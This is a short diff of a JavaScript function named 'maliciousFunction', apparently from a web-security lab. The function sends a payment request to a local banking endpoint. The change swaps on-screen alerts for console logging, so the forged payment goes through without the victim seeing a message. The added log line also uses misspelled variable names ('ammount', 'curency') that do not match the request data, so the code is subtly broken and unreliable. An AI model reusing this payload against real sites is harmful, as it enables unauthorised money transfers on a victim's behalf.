@@ -22,10 +22,10 @@ function maliciousFunction() {
 		url : "http://localhost:8080/payments",
 		data : JSONNewPayment(recipient, account, amount, currency, managerId),
 		success : function() {
-			alert("Uplata je uspešno izvršena.");
+			console.log("Uplata je uspešno izvršena. Uplaćeno je " + ammount + " " + curency + " na račun " + recipient);
 		},
 		error : function(e) {
-			alert("Dogodila se greška!");
+			console.log("Dogodila se greška!");
 		}
 	});
 }
